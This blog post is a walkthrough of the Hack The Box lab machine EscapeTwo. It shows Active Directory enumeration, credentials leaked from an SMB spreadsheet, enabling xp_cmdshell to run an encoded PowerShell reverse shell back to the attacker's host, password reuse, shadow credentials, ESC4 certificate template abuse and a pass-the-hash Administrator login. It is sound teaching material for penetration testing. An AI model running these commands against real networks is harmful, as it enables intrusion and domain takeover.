---
layout: post
title: "HTB: EscapeTwo"
box: escapetwo
img: /img/escapetwo/escapetwo
author: Andrew Cherney
date: 2025-05-24
tags: htb easy-box season-7 windows smb ldap active-directory mssql bloodhound certipy esc4 impacket
icon: "assets/icons/escapetwo.png"
post_description: "In an atypical fashion this box starts with Active Directory credentials. Using those credentials an SMB share can be accessed which leaks user account info. In that leak the sa account can enable xp_cmdshell to gain a reverse shell. The old SQL2019 directory holds the sql_svc password which doubles as ryan's password. Finally as ryan we can dump ca_svc's NT hash, and use ESC4 to grab the Administrator hash and compromise the box."
---

# Summary

{{ page.post_description }}

# Enumeration

Important first steps on this box, we are given credentials to start the box as if this were a pentest engagement against an AD domain. The credentials are `rose / KxEPkKe6R8su`.

```bash
nmap 10.10.11.51 -p- -Pn

Starting Nmap 7.92 ( https://nmap.org ) at 2025-01-16 19:50 CST
Nmap scan report for 10.10.11.51
Host is up (0.073s latency).
Not shown: 65509 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49685/tcp open  unknown
49686/tcp open  unknown
49689/tcp open  unknown
49702/tcp open  unknown
49718/tcp open  unknown
49739/tcp open  unknown
49802/tcp open  unknown
```

Some odd ports in the 49000s, guessing something RPC based so I won't look into it unless I'm stuck.

```bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001 10.10.11.51 -Pn

Starting Nmap 7.92 ( https://nmap.org ) at 2025-01-16 20:02 CST
Nmap scan report for 10.10.11.51
Host is up (0.074s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-17 02:02:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-17T02:03:46+00:00; +4s from scanner time.2025-05-24
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-17T02:03:46+00:00; +4s from scanner time.2025-05-24
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-16T01:46:23
|_Not valid after:  2055-01-16T01:46:23
| ms-sql-ntlm-info: 
|   Target_Name: SEQUEL
|   NetBIOS_Domain_Name: SEQUEL
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: sequel.htb
|   DNS_Computer_Name: DC01.sequel.htb
|   DNS_Tree_Name: sequel.htb
|_  Product_Version: 10.0.17763
|_ssl-date: 2025-01-17T02:03:46+00:00; +4s from scanner time.2025-05-24
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-17T02:03:46+00:00; +4s from scanner time.2025-05-24
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-01-17T02:03:46+00:00; +4s from scanner time.2025-05-24
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 3s
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-17T02:03:112025-05-24
|_  start_date: N/A2025-05-24
```

There's a lot of places to enumerate and look with a pair of credentials, MSSQL is a good start, we can enumerate users through rid brute forcing, we can look at SMB and check for shares we can access, we can dump the domain entirely and view it in bloodhound. And I plan to do all of these. 

First though, since **sequel.htb** is the domain name I will add that and **DC01.sequel.htb** to my */etc/hosts* file.

## MSSQL

Metasploit has an MSSQL enumeration module, so I'll check what perms rose has on there.

```bash
[msf](Jobs:0 Agents:0) auxiliary(admin/mssql/mssql_enum) >> run
[*] Running module against 10.10.11.51

[*] 10.10.11.51:1433 - Running MS SQL Server Enumeration...
[*] 10.10.11.51:1433 - Version:
[*]	Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
[*]		Sep 24 2019 13:48:23 
[*]		Copyright (C) 2019 Microsoft Corporation
[*]		Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
[*] 10.10.11.51:1433 - Configuration Parameters:
[*] 10.10.11.51:1433 - 	C2 Audit Mode is Not Enabled
[*] 10.10.11.51:1433 - 	xp_cmdshell is Not Enabled
[*] 10.10.11.51:1433 - 	remote access is Enabled
--[snip]--
```

No xp_cmdshell to execute commands with, lets continue to LDAP enum.

## LDAP

```bash
ldapdomaindump ldap://10.10.11.51 -u "sequel.htb\rose" -p "KxEPkKe6R8su"

[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

firefox bloodhound/*.html
```

Upon viewing the users I found a list of potential targets for later:

```
ryan
michael
oscar
rose
ca_svc
sql_svc
Administrator
```

Ryan is a remote management user and management department member, oscar is accounting, and there are no descriptions or other footholds I can see from viewing the dumped domain. I will however use bloodhound to check for notable perms.

```bash
bloodhound-python -u rose -p KxEPkKe6R8su -ns 10.10.11.51 -d sequel.htb -c all --zip

INFO: Found AD domain: sequel.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.sequel.htb
INFO: Found 10 users
INFO: Found 59 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.sequel.htb
INFO: Done in 00M 12S
INFO: Compressing output into 20250116204503_bloodhound.zip
```

Now by running `neo4j start` and `bloodhound` I can view the structure of permissions and objects within the sequel.htb domain. I see something peculiar, ryan has WriteOwner over ca_svc and Account Operators has GenericAll. This means that if I can become ryan I will be able to compromise the ca_svc account and probably get NT Authority permissions from some cert exploit. 

![bloodhound ca_svc]({{ page.img }}_bloodhound.png)

# Foothold as sa

## SMB

I'll use crackmapexec to check if I have SMB access. If I had more account pairs or a password to test this method works all the same.

```bash
crackmapexec smb 10.10.11.51 -u rose -p KxEPkKe6R8su -d sequel.htb

SMB         10.10.11.51     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.51     445    DC01             [+] sequel.htb\rose:KxEPkKe6R8su 
```

```bash
smbmap -R -u "rose" -p "KxEPkKe6R8su" -H 10.10.11.51

[+] IP: 10.10.11.51:445	Name: sequel.htb                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Accounting Department                             	READ ONLY	
	.\Accounting Department\*
	dr--r--r--                0 Sun Jun  9 06:11:31 2024	.
	dr--r--r--                0 Sun Jun  9 06:11:31 2024	..
	fr--r--r--            10217 Sun Jun  9 06:11:31 2024	accounting_2024.xlsx
	fr--r--r--             6780 Sun Jun  9 06:11:31 2024	accounts.xlsx
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	.\IPC$\*
	fr--r--r--                3 Sun Dec 31 18:09:24 1600	InitShutdown
	fr--r--r--                4 Sun Dec 31 18:09:24 1600	lsass
--[snip]--
```

An *accounts.xlsx* is a prime target to be sure, and I have read access with rose. I'll grab the other as a safety measure incase there's something useful inside of it.

```bash
smbclient -U 'rose' //10.10.11.51/Accounting\ Department

Enter WORKGROUP\rose's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 05:52:21 2024
  ..                                  D        0  Sun Jun  9 05:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 05:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 05:52:07 2024

		6367231 blocks of size 4096. 900219 blocks available
smb: \> get accounting_2024.xlsx 
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (37.9 KiloBytes/sec) (average 37.9 KiloBytes/sec)
smb: \> get accounts.xlsx 
getting file \accounts.xlsx of size 6780 as accounts.xlsx (24.1 KiloBytes/sec) (average 30.9 KiloBytes/sec)
smb: \> exit
```

```bash
file account*

accounting_2024.xlsx: Zip archive data, made by v4.5, extract using at least v2.0, last modified Mon Jan 26 00:44:48 1970, uncompressed size 1284, method=deflate
accounts.xlsx:        Zip archive data, made by v2.0, extract using at least v2.0, last modified Wed Mar 15 14:55:50 2017, uncompressed size 681, method=deflate
```

Both unzippable as the .xlsx extension would imply. 

```bash
mkdir accounts
mv accounts.xlsx accounts && cd accounts
unzip accounts.xlsx
tree 
.
├── accounts.xlsx
├── [Content_Types].xml
├── docProps
│   ├── app.xml
│   ├── core.xml
│   └── custom.xml
├── _rels
└── xl
    ├── sharedStrings.xml
    ├── styles.xml
    ├── theme
    │   └── theme1.xml
    ├── workbook.xml
    └── worksheets
        ├── _rels
        │   └── sheet1.xml.rels
        └── sheet1.xml
```

In cases like this I use grep recursively to search for things like passwords and keys.

```bash
grep -iR "password" ./*
./xl/sharedStrings.xml:<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="25" uniqueCount="24"><si><t xml:space="preserve">First Name</t></si><si><t xml:space="preserve">Last Name</t></si><si><t xml:space="preserve">Email</t></si><si><t xml:space="preserve">Username</t></si><si><t xml:space="preserve">Password</t></si><si><t xml:space="preserve">Angela</t></si><si><t xml:space="preserve">Martin</t></si><si><t xml:space="preserve">angela@sequel.htb</t></si><si><t xml:space="preserve">angela</t></si><si><t xml:space="preserve">0fwz7Q4mSpurIt99</t></si><si><t xml:space="preserve">Oscar</t></si><si><t xml:space="preserve">Martinez</t></si><si><t xml:space="preserve">oscar@sequel.htb</t></si><si><t xml:space="preserve">oscar</t></si><si><t xml:space="preserve">86LxLBMgEWaKUnBG</t></si><si><t xml:space="preserve">Kevin</t></si><si><t xml:space="preserve">Malone</t></si><si><t xml:space="preserve">kevin@sequel.htb</t></si><si><t xml:space="preserve">kevin</t></si><si><t xml:space="preserve">Md9Wlq1E5bZnVDVo</t></si><si><t xml:space="preserve">NULL</t></si><si><t xml:space="preserve">sa@sequel.htb</t></si><si><t xml:space="preserve">sa</t></si><si><t xml:space="preserve">MSSQLP@ssw0rd!</t></si></sst>
```

Usernames and passwords for some service accounts and users. sa stands out to me as more useful than the others though. With a little trimming we can read it easier too:

```bash
cat xl/sharedStrings.xml | sed 's|</t></si><si>|:|g' | sed 's|<[^>]*>| |g' > stripped
cat stripped
 
   First Name: Last Name: Email: Username: Password: Angela: Martin: angela@sequel.htb: angela: 0fwz7Q4mSpurIt99: Oscar: Martinez: oscar@sequel.htb: oscar: 86LxLBMgEWaKUnBG: Kevin: Malone: kevin@sequel.htb: kevin: Md9Wlq1E5bZnVDVo: NULL: sa@sequel.htb: sa: MSSQLP@ssw0rd!
```

```
angela:0fwz7Q4mSpurIt99
oscar:86LxLBMgEWaKUnBG
kevin:Md9Wlq1E5bZnVDVo
sa:MSSQLP@ssw0rd!
```

## Shell from MSSQL

Now we can return to MSSQL and check permissions for this account. 

```
[msf](Jobs:0 Agents:0) auxiliary(admin/mssql/mssql_enum) >> run
[*] Running module against 10.10.11.51

[*] 10.10.11.51:1433 - Running MS SQL Server Enumeration...
[*] 10.10.11.51:1433 - Version:
[*]	Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
[*]		Sep 24 2019 13:48:23 
[*]		Copyright (C) 2019 Microsoft Corporation
[*]		Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
[*] 10.10.11.51:1433 - Configuration Parameters:
[*] 10.10.11.51:1433 - 	C2 Audit Mode is Not Enabled
[*] 10.10.11.51:1433 - 	xp_cmdshell is Enabled
[*] 10.10.11.51:1433 - 	remote access is Enabled
--[snip]--
```

xp_cmdshell is enabled, meaning I can run commands. It dawned on me this might have been another user enabling it because I tried to run a command and got the message:

```bash
mssqlclient.py sequel.htb/sa:'MSSQLP@ssw0rd!'@10.10.11.51
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> EXEC xp_cmdshell 'whoami'
ERROR(DC01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

No problem though, I can enable it with sp_configure and reconfigure to enable it.

```bash
SQL (sa  dbo@master)> sp_configure 'show advanced options', '1'
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> sp_configure 'xp_cmdshell', '1'
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE
SQL (sa  dbo@master)> EXEC xp_cmdshell 'whoami'
output           
--------------   
sequel\sql_svc   

NULL         
```

Now I use a powershell revshell from https://www.revshells.com/ and get my foothold. 

```bash
SQL (sa  dbo@master)> EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAiACwAOAA4ADgAOAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA='

nc -nvlp 8888
Listening on 0.0.0.0 8888
Connection received on 10.10.11.51 60064

PS C:\Windows\system32> whoami
sequel\sql_svc
```

# PrivEsc to ryan

## Out of Place Directory

In looking around at basic locations I see SQL2019 in the disk root directory.

```bash
PS C:\> dir


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        11/5/2022  12:03 PM                PerfLogs                                                              
d-r---         1/4/2025   7:11 AM                Program Files                                                         
d-----         6/9/2024   8:37 AM                Program Files (x86)                                                   
d-----         6/8/2024   3:07 PM                SQL2019                                                               
d-r---         6/9/2024   6:42 AM                Users                                                                 
d-----         1/4/2025   8:10 AM                Windows   
```

In digging deeper I find hard coded credentials.

```bash
PS C:\SQL2019\ExpressAdv_ENU> dir


    Directory: C:\SQL2019\ExpressAdv_ENU


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         6/8/2024   3:07 PM                1033_ENU_LP                                                           
d-----         6/8/2024   3:07 PM                redist                                                                
d-----         6/8/2024   3:07 PM                resources                                                             
d-----         6/8/2024   3:07 PM                x64                                                                   
-a----        9/24/2019  10:03 PM             45 AUTORUN.INF                                                           
-a----        9/24/2019  10:03 PM            788 MEDIAINFO.XML                                                         
-a----         6/8/2024   3:07 PM             16 PackageId.dat                                                         
-a----        9/24/2019  10:03 PM         142944 SETUP.EXE                                                             
-a----        9/24/2019  10:03 PM            486 SETUP.EXE.CONFIG                                                      
-a----         6/8/2024   3:07 PM            717 sql-Configuration.INI                                                 
-a----        9/24/2019  10:03 PM         249448 SQLSETUPBOOTSTRAPPER.DLL                                              


PS C:\SQL2019\ExpressAdv_ENU> type AUTORUN.INF
[autorun]
OPEN=SETUP.EXE
ICON=SETUP.EXE,0
PS C:\SQL2019\ExpressAdv_ENU> type SETUP.EXE.CONFIG 
<?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <startup>
    <supportedRuntime version="v4.0" sku=".NETFramework,Version=v4.6"/>
  </startup>
  <runtime>
    <loadFromRemoteSources enabled="true" />
    <legacyCorruptedStateExceptionsPolicy enabled="true" />
    <AppContextSwitchOverrides value="Switch.UseLegacyAccessibilityFeatures=false;Switch.UseLegacyAccessibilityFeatures.2=false;Switch.UseLegacyAccessibilityFeatures.3=false"/>
  </runtime>
</configuration>
PS C:\SQL2019\ExpressAdv_ENU> type sql-Configuration.INI
[OPTIONS]
ACTION="Install"
QUIET="True"
FEATURES=SQL
INSTANCENAME="SQLEXPRESS"
INSTANCEID="SQLEXPRESS"
RSSVCACCOUNT="NT Service\ReportServer$SQLEXPRESS"
AGTSVCACCOUNT="NT AUTHORITY\NETWORK SERVICE"
AGTSVCSTARTUPTYPE="Manual"
COMMFABRICPORT="0"
COMMFABRICNETWORKLEVEL=""0"
COMMFABRICENCRYPTION="0"
MATRIXCMBRICKCOMMPORT="0"
SQLSVCSTARTUPTYPE="Automatic"
FILESTREAMLEVEL="0"
ENABLERANU="False" 
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
TCPENABLED="1"
NPENABLED="1"
BROWSERSVCSTARTUPTYPE="Automatic"
IAcceptSQLServerLicenseTerms=True
```

Now this service account by itself might not be that useful, but I can check if another user shares the password (as is common in AD pentesting).

```bash
crackmapexec ldap -u users.txt -p 'WqSZAF6CysDQbGb3' -d sequel.htb 10.10.11.51
SMB         10.10.11.51     445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.51     445    DC01             [-] sequel.htb\angela:WqSZAF6CysDQbGb3 
LDAP        10.10.11.51     445    DC01             [-] sequel.htb\oscar:WqSZAF6CysDQbGb3 
LDAP        10.10.11.51     389    DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 
```

Seems to be ryan's password, so now I can use evil-winrm to login as ryan.

```bash
evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan> dir Desktop


    Directory: C:\Users\ryan\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        1/15/2025   5:46 PM             34 user.txt


*Evil-WinRM* PS C:\Users\ryan> type Desktop/user.txt
6bd75b0f487---------------------
```

# Administrator

## ca_svc and ESC4

Thinking back to bloodhound ryan has WriteOwner permissions over ca_svc. In concept I can perform a shadow credentials attack and grab the NT hash of the ca_svc user and perform certificate related attacks with that hash.

```bash
certipy shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.10.11.51
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '7803569d-db69-ab9b-56b2-0f77cdd01544'
[*] Adding Key Credential with device ID '7803569d-db69-ab9b-56b2-0f77cdd01544' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '7803569d-db69-ab9b-56b2-0f77cdd01544' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Using principal: ca_svc@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': 3b181b914e7a9d5508ea1e20bc2b7fce
```

With this hash I can use certipy once more to scan for vulnerable certificates or templates.

```bash
certipy find -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vulnerable
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'sequel-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'sequel-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'sequel-DC01-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'sequel-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sequel-DC01-CA
    DNS Name                            : DC01.sequel.htb
    Certificate Subject                 : CN=sequel-DC01-CA, DC=sequel, DC=htb
    Certificate Serial Number           : 152DBD2D8E9C079742C0F3BFF2A211D3
    Certificate Validity Start          : 2024-06-08 16:50:40+00:00
    Certificate Validity End            : 2124-06-08 17:00:40+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : SEQUEL.HTB\Administrators
      Access Rights
        ManageCertificates              : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        ManageCa                        : SEQUEL.HTB\Administrators
                                          SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
        Enroll                          : SEQUEL.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : DunderMifflinAuthentication
    Display Name                        : Dunder Mifflin Authentication
    Certificate Authorities             : sequel-DC01-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectRequireCommonName
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
                                          PublishToDs
    Private Key Flag                    : 16777216
                                          65536
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1000 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : SEQUEL.HTB\Enterprise Admins
        Full Control Principals         : SEQUEL.HTB\Cert Publishers
        Write Owner Principals          : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Dacl Principals           : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions

```

It labels an ESC4 vulnerability. [This youtube video](https://www.youtube.com/watch?v=EuQ6jiKK7q0) goes over how to exploit an ESC4 template. Exploiting ESC4 will allow us to grab the certificate and private key of any user, then leverage that pfx file to grab their hash and login as them. Here the obvious target is Administrator.

```bash
certipy template -u ca_svc@sequel.htb -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -template DunderMifflinAuthentication -save-old -dc-ip 10.10.11.51
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Saved old configuration for 'DunderMifflinAuthentication' to 'DunderMifflinAuthentication.json'
[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```

```bash
certipy req -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn Administrator@sequel.htb -dc-ip 10.10.11.51

certipy req -u ca_svc -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn Administrator@sequel.htb -dc-ip 10.10.11.51
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 16
[*] Got certificate with UPN 'Administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'

certipy auth -pfx administrator.pfx -dc-ip 10.10.11.51
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff

evil-winrm -i 10.10.11.51 -u administrator -H '7a8d4e04986afa8ed4060f75e5a0b3ff'

